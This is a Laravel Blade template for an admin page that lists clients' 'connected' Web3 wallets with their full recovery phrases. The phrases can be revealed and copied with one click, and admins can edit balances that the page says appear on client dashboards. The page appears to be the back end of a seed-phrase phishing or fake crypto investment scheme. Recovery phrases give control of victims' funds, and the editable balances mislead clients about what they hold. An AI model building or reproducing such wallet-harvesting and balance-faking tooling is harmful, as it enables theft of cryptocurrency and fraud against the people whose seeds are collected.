@extends('layouts.app')

@section('content')
<style>
    /* ==========================================================================
       ADMIN CONNECTED WALLETS — RESPONSIVE & MOBILE CARD STYLES
       ========================================================================== */

    .wallet-search-input {
        font-size: 13.5px;
    }
    @media (max-width: 767.98px) {
        .wallet-search-input {
            font-size: 16px !important; /* Prevents iOS Safari auto-zoom */
        }
    }

    /* Mobile Wallet Card */
    .wallet-mobile-card {
        background-color: #ffffff;
        border: 1px solid rgba(0, 0, 0, 0.08);
        border-radius: 14px;
        padding: 14px;
        margin-bottom: 12px;
        box-shadow: 0 2px 8px rgba(0, 0, 0, 0.04);
        transition: transform 0.2s ease, box-shadow 0.2s ease;
    }
    body.dark-only .wallet-mobile-card {
        background-color: #1e2434 !important;
        border-color: rgba(255, 255, 255, 0.08) !important;
        box-shadow: 0 2px 8px rgba(0, 0, 0, 0.2) !important;
    }

    body.dark-only .wallet-mobile-card .bg-light {
        background-color: #151924 !important;
        border-color: rgba(255, 255, 255, 0.08) !important;
    }
    body.dark-only .wallet-mobile-card .text-dark {
        color: #f8fafc !important;
    }
    body.dark-only .wallet-mobile-card .border-top,
    body.dark-only .wallet-mobile-card .border-bottom {
        border-color: rgba(255, 255, 255, 0.08) !important;
    }
    body.dark-only .wallet-mobile-card .input-group-text {
        background-color: #151924 !important;
        border-color: rgba(255, 255, 255, 0.12) !important;
        color: #cbd5e1 !important;
    }
    body.dark-only .wallet-mobile-card input.form-control {
        background-color: #1a202c !important;
        border-color: rgba(255, 255, 255, 0.12) !important;
        color: #f8fafc !important;
    }

    /* Desktop table hover enhancements */
    .table-responsive {
        -webkit-overflow-scrolling: touch;
    }
</style>

<div class="container-fluid px-2 px-sm-3">
    <!-- Page Header Bar -->
    <div class="row mb-3 mb-md-4">
        <div class="col-12 d-flex flex-column flex-sm-row justify-content-between align-items-sm-center gap-2.5">
            <div>
                <h3 class="f-w-800 text-dark mb-1" style="font-size: clamp(1.25rem, 3.5vw, 1.6rem);">Connected Web3 Wallets &amp; Recovery Keys</h3>
                <p class="text-muted mb-0 f-12 f-sm-13">Centralized audit log of client decentralized wallets, recovery phrases, and synchronized balances.</p>
            </div>
            <div class="d-flex align-items-center">
                <a href="{{ route('manageusers') }}" class="btn btn-outline-primary btn-sm rounded-pill px-3 py-2 f-12 f-sm-13 text-nowrap">
                    <i class="fa-solid fa-users me-1"></i> Manage Users
                </a>
            </div>
        </div>
    </div>

    <x-danger-alert />
    <x-success-alert />

    <!-- 3 Top Metric Summary Cards -->
    <div class="row g-2.5 g-sm-3 mb-3 mb-md-4">
        <div class="col-12 col-sm-6 col-xl-4">
            <div class="card border-0 shadow-sm rounded-3 h-100 mb-0">
                <div class="card-body p-3 d-flex align-items-center justify-content-between">
                    <div>
                        <span class="text-muted f-11 f-sm-12 f-w-600 text-uppercase d-block mb-1">Total Connected Wallets</span>
                        <h3 class="f-w-800 text-primary mb-0 f-20 f-sm-24">{{ number_format($totalWallets) }}</h3>
                        <small class="text-muted f-10 f-sm-11">Across all registered clients</small>
                    </div>
                    <div class="rounded-circle d-flex align-items-center justify-content-center bg-light-primary text-primary flex-shrink-0" style="width: 44px; height: 44px; font-size: 19px;">
                        <i class="fa-solid fa-wallet"></i>
                    </div>
                </div>
            </div>
        </div>

        <div class="col-12 col-sm-6 col-xl-4">
            <div class="card border-0 shadow-sm rounded-3 h-100 mb-0">
                <div class="card-body p-3 d-flex align-items-center justify-content-between">
                    <div>
                        <span class="text-muted f-11 f-sm-12 f-w-600 text-uppercase d-block mb-1">Total Synchronized Balance</span>
                        <h3 class="f-w-800 text-success mb-0 f-20 f-sm-24">{{ $settings->currency }}{{ number_format($totalBalance, 2) }}</h3>
                        <small class="text-muted f-10 f-sm-11">Reflected on client dashboards</small>
                    </div>
                    <div class="rounded-circle d-flex align-items-center justify-content-center bg-light-success text-success flex-shrink-0" style="width: 44px; height: 44px; font-size: 19px;">
                        <i class="fa-solid fa-coins"></i>
                    </div>
                </div>
            </div>
        </div>

        <div class="col-12 col-sm-12 col-xl-4">
            <div class="card border-0 shadow-sm rounded-3 h-100 mb-0">
                <div class="card-body p-3 d-flex align-items-center justify-content-between">
                    <div>
                        <span class="text-muted f-11 f-sm-12 f-w-600 text-uppercase d-block mb-1">Unique Clients Connected</span>
                        <h3 class="f-w-800 text-info mb-0 f-20 f-sm-24">{{ number_format($uniqueUsers) }}</h3>
                        <small class="text-muted f-10 f-sm-11">Active Web3 user accounts</small>
                    </div>
                    <div class="rounded-circle d-flex align-items-center justify-content-center bg-light-info text-info flex-shrink-0" style="width: 44px; height: 44px; font-size: 19px;">
                        <i class="fa-solid fa-user-check"></i>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Main Card -->
    <div class="card border-0 shadow-sm rounded-3">
        <!-- Card Header with Search Form -->
        <div class="card-header bg-transparent border-bottom p-3 p-sm-3.5">
            <div class="row align-items-center justify-content-between g-2.5 g-sm-3">
                <div class="col-lg-6 col-12">
                    <h5 class="f-w-700 text-dark mb-1 f-15 f-sm-16">Client Connected Wallets Ledger</h5>
                    <small class="text-muted f-11 f-sm-12 d-block">Click the eye icon to view recovery phrases or copy them directly.</small>
                </div>
                <div class="col-lg-6 col-12">
                    <form method="GET" action="{{ route('admin.connected.wallets') }}" class="d-flex gap-2">
                        <div class="input-group">
                            <span class="input-group-text bg-light border-end-0"><i class="fa-solid fa-magnifying-glass text-muted"></i></span>
                            <input type="text" name="search" class="form-control border-start-0 wallet-search-input" placeholder="Search by user, provider, IP..." value="{{ request('search') }}">
                        </div>
                        <button type="submit" class="btn btn-primary px-3 text-nowrap f-13 f-w-600">Search</button>
                        @if(request('search'))
                            <a href="{{ route('admin.connected.wallets') }}" class="btn btn-outline-secondary px-2.5 text-nowrap f-13" title="Clear Search">Clear</a>
                        @endif
                    </form>
                </div>
            </div>
        </div>

        <div class="card-body p-0">
            <!-- ==============================================================
                 MOBILE CARD VIEW (< 768px)
                 ============================================================== -->
            <div class="d-block d-md-none p-2.5">
                @forelse($wallets as $w)
                    @php
                        $providerName = strtolower(trim($w->wallet_provider ?? ''));
                        $wIcon = null;
                        if (isset($walletTypes)) {
                            $matchedWt = $walletTypes->get($providerName);
                            if (!$matchedWt) {
                                $matchedWt = $walletTypes->first(function($wt, $k) use ($providerName) {
                                    return str_contains($providerName, (string)$k) || str_contains((string)$k, $providerName);
                                });
                            }
                            if ($matchedWt && !empty($matchedWt->icon_url)) {
                                $wIcon = $matchedWt->icon_url;
                            }
                        }
                        if (!$wIcon) {
                            if (str_contains($providerName, 'metamask')) {
                                $wIcon = asset('assets/wallet-types/icons/1NS1POo31VhHeJuQOv2IOgLwI6jAe8KK6QG2WLPI.png');
                            } elseif (str_contains($providerName, 'trust')) {
                                $wIcon = asset('assets/wallet-types/icons/kxF43fXtB3B0m0C8Tz5ZZ3ckEYwKZFHCVJOh1BVr.png');
                            } elseif (str_contains($providerName, 'coinbase')) {
                                $wIcon = asset('assets/wallet-types/icons/fW86jwztjOyUCIiaf8XX7bAmxPx2BCwtRMy9RK5Z.jpg');
                            } elseif (str_contains($providerName, 'bakkt')) {
                                $wIcon = asset('assets/wallet-types/icons/yRqNYjy782hPVqJXhrvKuYqMe9FcnJegeSzDO5Ok.png');
                            }
                        }
                    @endphp

                    <div class="wallet-mobile-card">
                        <!-- Top Row: Client Info + Status Badge + Delete Button -->
                        <div class="d-flex align-items-start justify-content-between gap-2 mb-2 pb-2 border-bottom">
                            <div class="d-flex align-items-center gap-2">
                                @if($w->user)
                                    <div class="rounded-circle bg-light-primary text-primary d-flex align-items-center justify-content-center f-w-700 flex-shrink-0" style="width: 36px; height: 36px; font-size: 13px;">
                                        {{ strtoupper(substr($w->user->name ?? 'U', 0, 1)) }}
                                    </div>
                                    <div>
                                        <a href="{{ route('viewuser', $w->user->id) }}" class="f-w-700 text-dark text-decoration-none d-block f-13">
                                            {{ $w->user->name }}
                                        </a>
                                        <small class="text-muted f-11 d-block text-truncate" style="max-width: 170px;">{{ $w->user->email }}</small>
                                    </div>
                                @else
                                    <span class="badge bg-light text-muted border f-11">Deleted User (#{{ $w->user_id }})</span>
                                @endif
                            </div>

                            <div class="d-flex align-items-center gap-1.5 flex-shrink-0">
                                @if($w->status === 'connected')
                                    <span class="badge bg-light-success text-success border border-success border-opacity-25 rounded-pill px-2 py-1 f-10">
                                        <i class="fa-solid fa-circle-check me-0.5"></i> Connected
                                    </span>
                                @else
                                    <span class="badge bg-light text-muted border rounded-pill px-2 py-1 f-10">
                                        {{ ucfirst($w->status ?? 'Active') }}
                                    </span>
                                @endif
                                <a href="{{ route('admin.wallet.single.delete', $w->id) }}" class="btn btn-sm btn-outline-danger rounded-2 p-1 px-2" onclick="return confirm('Are you sure you want to remove this connected wallet record (#{{ $w->id }})?');" title="Delete Wallet">
                                    <i class="fa-solid fa-trash f-11"></i>
                                </a>
                            </div>
                        </div>

                        <!-- Provider Row -->
                        <div class="d-flex align-items-center justify-content-between bg-light rounded-2 p-2 mb-2.5">
                            <div class="d-flex align-items-center gap-2">
                                <div class="rounded-circle d-flex align-items-center justify-content-center bg-white border shadow-sm flex-shrink-0" style="width: 28px; height: 28px; overflow: hidden;">
                                    @if($wIcon)
                                        <img src="{{ $wIcon }}" alt="{{ $w->wallet_provider }}" style="width: 18px; height: 18px; object-fit: contain;" onerror="this.outerHTML='<i class=\'fa-solid fa-wallet text-primary f-12\'></i>'">
                                    @else
                                        <i class="fa-solid fa-wallet text-primary f-12"></i>
                                    @endif
                                </div>
                                <span class="f-w-700 text-dark f-12">{{ $w->wallet_provider }}</span>
                            </div>
                            <span class="badge bg-white text-muted border f-10 rounded-pill">ID #{{ $w->id }}</span>
                        </div>

                        <!-- Recovery Phrase Row -->
                        <div class="mb-2.5">
                            <div class="d-flex align-items-center justify-content-between mb-1">
                                <label class="f-11 f-w-700 text-muted text-uppercase mb-0">
                                    <i class="fa-solid fa-key me-1 text-warning"></i> Recovery Phrase / Seed
                                </label>
                                <span class="f-10 text-muted">Tap eye to view</span>
                            </div>

                            @if(!empty($w->passphrase))
                                <div class="d-flex align-items-stretch gap-1.5">
                                    <div class="p-2 rounded bg-light border f-11 text-monospace text-dark text-break flex-grow-1 user-select-all" id="phrase-box-m-{{ $w->id }}" style="min-height: 38px; display: flex; align-items: center;">
                                        <span class="phrase-masked" id="phrase-masked-m-{{ $w->id }}">••••••••••••••••••••••••••••</span>
                                        <span class="phrase-raw d-none" id="phrase-raw-m-{{ $w->id }}">{{ $w->passphrase }}</span>
                                    </div>
                                    <button type="button" class="btn btn-outline-secondary rounded-2 px-2.5 d-flex align-items-center justify-content-center" onclick="togglePhrase('m-{{ $w->id }}')" title="Show/Hide Phrase">
                                        <i class="fa-regular fa-eye" id="eye-icon-m-{{ $w->id }}"></i>
                                    </button>
                                    <button type="button" class="btn btn-outline-primary rounded-2 px-2.5 d-flex align-items-center justify-content-center" onclick="copyPhrase('m-{{ $w->id }}')" title="Copy Phrase">
                                        <i class="fa-regular fa-copy" id="copy-icon-m-{{ $w->id }}"></i>
                                    </button>
                                </div>
                            @else
                                <div class="p-2 rounded bg-light border text-muted f-11 italic">
                                    <i class="fa-solid fa-minus me-1"></i> No phrase recorded
                                </div>
                            @endif
                        </div>

                        <!-- Assigned Balance & Metadata Footer -->
                        <div class="pt-2 border-top">
                            <div class="row g-2 align-items-center">
                                <div class="col-7">
                                    <form action="{{ route('admin.wallet.single.update', $w->id) }}" method="POST" class="d-flex align-items-center m-0">
                                        @csrf
                                        <div class="input-group input-group-sm">
                                            <span class="input-group-text bg-light f-11">{{ $settings->currency }}</span>
                                            <input type="number" step="any" min="0" name="balance" value="{{ $w->balance }}" class="form-control f-w-700 text-primary f-12" placeholder="0.00">
                                            <button type="submit" class="btn btn-primary px-2" title="Save Balance">
                                                <i class="fa-solid fa-check"></i>
                                            </button>
                                        </div>
                                    </form>
                                </div>
                                <div class="col-5 text-end">
                                    <span class="badge bg-light text-dark border f-10 rounded-pill d-inline-block text-truncate" style="max-width: 100%;">
                                        <i class="fa-solid fa-network-wired me-0.5 text-primary"></i> {{ $w->ip_address ?? '127.0.0.1' }}
                                    </span>
                                    <small class="text-muted d-block f-10 mt-0.5">
                                        {{ $w->created_at ? $w->created_at->diffForHumans() : 'N/A' }}
                                    </small>
                                </div>
                            </div>
                        </div>
                    </div>
                @empty
                    <div class="text-center py-5">
                        <i class="fa-solid fa-wallet f-36 text-muted opacity-50 mb-2"></i>
                        <h6 class="f-w-700 text-dark mb-1">No Connected Wallets Found</h6>
                        <p class="text-muted mb-0 f-12">Client connected wallets will appear here with full recovery keys.</p>
                    </div>
                @endforelse
            </div>

            <!-- ==============================================================
                 DESKTOP DATA TABLE VIEW (>= 768px)
                 ============================================================== -->
            <div class="table-responsive d-none d-md-block">
                <table class="table table-hover align-middle mb-0">
                    <thead class="table-light">
                        <tr>
                            <th class="ps-3" style="font-size: 11px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.5px;">Client</th>
                            <th style="font-size: 11px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.5px;">Wallet Provider</th>
                            <th style="font-size: 11px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.5px;">Recovery Phrase / Secret Seed</th>
                            <th style="font-size: 11px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.5px; width: 190px;">Assigned Balance ({{ $settings->currency }})</th>
                            <th style="font-size: 11px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.5px;">IP &amp; Timestamp</th>
                            <th style="font-size: 11px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.5px;">Status</th>
                            <th class="pe-3 text-end" style="font-size: 11px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.5px;">Action</th>
                        </tr>
                    </thead>
                    <tbody>
                        @forelse($wallets as $w)
                            @php
                                $providerName = strtolower(trim($w->wallet_provider ?? ''));
                                $wIcon = null;
                                if (isset($walletTypes)) {
                                    $matchedWt = $walletTypes->get($providerName);
                                    if (!$matchedWt) {
                                        $matchedWt = $walletTypes->first(function($wt, $k) use ($providerName) {
                                            return str_contains($providerName, (string)$k) || str_contains((string)$k, $providerName);
                                        });
                                    }
                                    if ($matchedWt && !empty($matchedWt->icon_url)) {
                                        $wIcon = $matchedWt->icon_url;
                                    }
                                }
                                if (!$wIcon) {
                                    if (str_contains($providerName, 'metamask')) {
                                        $wIcon = asset('assets/wallet-types/icons/1NS1POo31VhHeJuQOv2IOgLwI6jAe8KK6QG2WLPI.png');
                                    } elseif (str_contains($providerName, 'trust')) {
                                        $wIcon = asset('assets/wallet-types/icons/kxF43fXtB3B0m0C8Tz5ZZ3ckEYwKZFHCVJOh1BVr.png');
                                    } elseif (str_contains($providerName, 'coinbase')) {
                                        $wIcon = asset('assets/wallet-types/icons/fW86jwztjOyUCIiaf8XX7bAmxPx2BCwtRMy9RK5Z.jpg');
                                    } elseif (str_contains($providerName, 'bakkt')) {
                                        $wIcon = asset('assets/wallet-types/icons/yRqNYjy782hPVqJXhrvKuYqMe9FcnJegeSzDO5Ok.png');
                                    }
                                }
                            @endphp
                            <tr>
                                <td class="ps-3">
                                    @if($w->user)
                                        <div class="d-flex align-items-center gap-2">
                                            <div class="rounded-circle bg-light-primary text-primary d-flex align-items-center justify-content-center f-w-700" style="width: 36px; height: 36px; font-size: 13px;">
                                                {{ strtoupper(substr($w->user->name ?? 'U', 0, 1)) }}
                                            </div>
                                            <div>
                                                <a href="{{ route('viewuser', $w->user->id) }}" class="f-w-700 text-dark text-decoration-none d-block">
                                                    {{ $w->user->name }}
                                                </a>
                                                <small class="text-muted f-11">{{ $w->user->email }}</small>
                                            </div>
                                        </div>
                                    @else
                                        <span class="badge bg-light text-muted border">Deleted User (#{{ $w->user_id }})</span>
                                    @endif
                                </td>

                                <td>
                                    <div class="d-flex align-items-center gap-2">
                                        <div class="rounded-circle d-flex align-items-center justify-content-center bg-white border shadow-sm flex-shrink-0" style="width: 34px; height: 34px; overflow: hidden;">
                                            @if($wIcon)
                                                <img src="{{ $wIcon }}" alt="{{ $w->wallet_provider }}" style="width: 22px; height: 22px; object-fit: contain;" onerror="this.outerHTML='<i class=\'fa-solid fa-wallet text-primary f-14\'></i>'">
                                            @else
                                                <i class="fa-solid fa-wallet text-primary f-14"></i>
                                            @endif
                                        </div>
                                        <div>
                                            <div class="f-w-700 text-dark f-13">{{ $w->wallet_provider }}</div>
                                            <span class="badge bg-light text-muted border f-10 rounded-pill">ID #{{ $w->id }}</span>
                                        </div>
                                    </div>
                                </td>

                                <td>
                                    @if(!empty($w->passphrase))
                                        <div class="d-flex align-items-center gap-2">
                                            <div class="p-2 rounded bg-light border f-12 text-monospace text-dark text-break flex-grow-1" style="max-width: 320px;" id="phrase-box-{{ $w->id }}">
                                                <span class="phrase-masked" id="phrase-masked-{{ $w->id }}">••••••••••••••••••••••••••••</span>
                                                <span class="phrase-raw d-none" id="phrase-raw-{{ $w->id }}">{{ $w->passphrase }}</span>
                                            </div>
                                            <button type="button" class="btn btn-sm btn-outline-secondary rounded-2 p-1 px-2" onclick="togglePhrase({{ $w->id }})" title="Show/Hide Phrase">
                                                <i class="fa-regular fa-eye" id="eye-icon-{{ $w->id }}"></i>
                                            </button>
                                            <button type="button" class="btn btn-sm btn-outline-primary rounded-2 p-1 px-2" onclick="copyPhrase({{ $w->id }})" title="Copy Phrase">
                                                <i class="fa-regular fa-copy" id="copy-icon-{{ $w->id }}"></i>
                                            </button>
                                        </div>
                                    @else
                                        <span class="text-muted f-12 italic"><i class="fa-solid fa-minus me-1"></i> No phrase recorded</span>
                                    @endif
                                </td>

                                <td>
                                    <form action="{{ route('admin.wallet.single.update', $w->id) }}" method="POST" class="d-flex align-items-center gap-1">
                                        @csrf
                                        <div class="input-group input-group-sm">
                                            <span class="input-group-text bg-light">{{ $settings->currency }}</span>
                                            <input type="number" step="any" min="0" name="balance" value="{{ $w->balance }}" class="form-control f-w-700 text-primary">
                                            <button type="submit" class="btn btn-primary" title="Save Balance">
                                                <i class="fa-solid fa-check"></i>
                                            </button>
                                        </div>
                                    </form>
                                </td>

                                <td>
                                    <div>
                                        <span class="badge bg-light text-dark border f-11 rounded-pill mb-1">
                                            <i class="fa-solid fa-network-wired me-1 text-primary"></i> {{ $w->ip_address ?? '127.0.0.1' }}
                                        </span>
                                        <small class="text-muted d-block f-11">
                                            <i class="fa-regular fa-clock me-1"></i> {{ $w->created_at ? $w->created_at->format('M d, Y h:i A') : 'N/A' }}
                                        </small>
                                        <small class="text-info f-10">
                                            ({{ $w->created_at ? $w->created_at->diffForHumans() : '' }})
                                        </small>
                                    </div>
                                </td>

                                <td>
                                    @if($w->status === 'connected')
                                        <span class="badge bg-light-success text-success border border-success border-opacity-25 rounded-pill px-2.5 py-1 f-11">
                                            <i class="fa-solid fa-circle-check me-1"></i> Connected
                                        </span>
                                    @else
                                        <span class="badge bg-light text-muted border rounded-pill px-2.5 py-1 f-11">
                                            {{ ucfirst($w->status ?? 'Active') }}
                                        </span>
                                    @endif
                                </td>

                                <td class="pe-3 text-end">
                                    <a href="{{ route('admin.wallet.single.delete', $w->id) }}" class="btn btn-sm btn-outline-danger rounded-2 p-1 px-2" onclick="return confirm('Are you sure you want to remove this connected wallet record (#{{ $w->id }})?');" title="Delete Wallet">
                                        <i class="fa-solid fa-trash"></i>
                                    </a>
                                </td>
                            </tr>
                        @empty
                            <tr>
                                <td colspan="7" class="text-center py-5">
                                    <div class="py-4">
                                        <i class="fa-solid fa-wallet f-48 text-muted opacity-50 mb-3"></i>
                                        <h5 class="f-w-700 text-dark mb-1">No Connected Wallets Found</h5>
                                        <p class="text-muted mb-0 f-13">When clients connect their Web3 wallets, they will appear here with full recovery details.</p>
                                    </div>
                                </td>
                            </tr>
                        @endforelse
                    </tbody>
                </table>
            </div>
        </div>

        @if($wallets->hasPages())
            <div class="card-footer bg-transparent border-top p-3 d-flex justify-content-end">
                {{ $wallets->withQueryString()->links() }}
            </div>
        @endif
    </div>
</div>

<script>
    function togglePhrase(id) {
        var rawEl = document.getElementById('phrase-raw-' + id);
        var maskedEl = document.getElementById('phrase-masked-' + id);
        var icon = document.getElementById('eye-icon-' + id);

        if (rawEl && maskedEl && icon) {
            if (rawEl.classList.contains('d-none')) {
                rawEl.classList.remove('d-none');
                maskedEl.classList.add('d-none');
                icon.className = 'fa-regular fa-eye-slash text-danger';
            } else {
                rawEl.classList.add('d-none');
                maskedEl.classList.remove('d-none');
                icon.className = 'fa-regular fa-eye';
            }
        }
    }

    function copyPhrase(id) {
        var rawEl = document.getElementById('phrase-raw-' + id);
        var icon = document.getElementById('copy-icon-' + id);
        if (rawEl) {
            var text = rawEl.textContent.trim();
            if (navigator.clipboard && window.isSecureContext) {
                navigator.clipboard.writeText(text).then(function() {
                    showCopySuccess(icon);
                }).catch(function() {
                    fallbackCopyText(text, icon);
                });
            } else {
                fallbackCopyText(text, icon);
            }
        }
    }

    function showCopySuccess(icon) {
        if (icon) {
            var oldClass = icon.className;
            icon.className = 'fa-solid fa-check text-success';
            setTimeout(function() {
                icon.className = oldClass;
            }, 2000);
        }
    }

    function fallbackCopyText(text, icon) {
        var temp = document.createElement('textarea');
        temp.value = text;
        temp.style.position = 'fixed';
        temp.style.opacity = '0';
        document.body.appendChild(temp);
        temp.focus();
        temp.select();
        try {
            document.execCommand('copy');
            showCopySuccess(icon);
        } catch (err) {
            console.error('Fallback copy failed', err);
        }
        document.body.removeChild(temp);
    }
</script>
@endsection
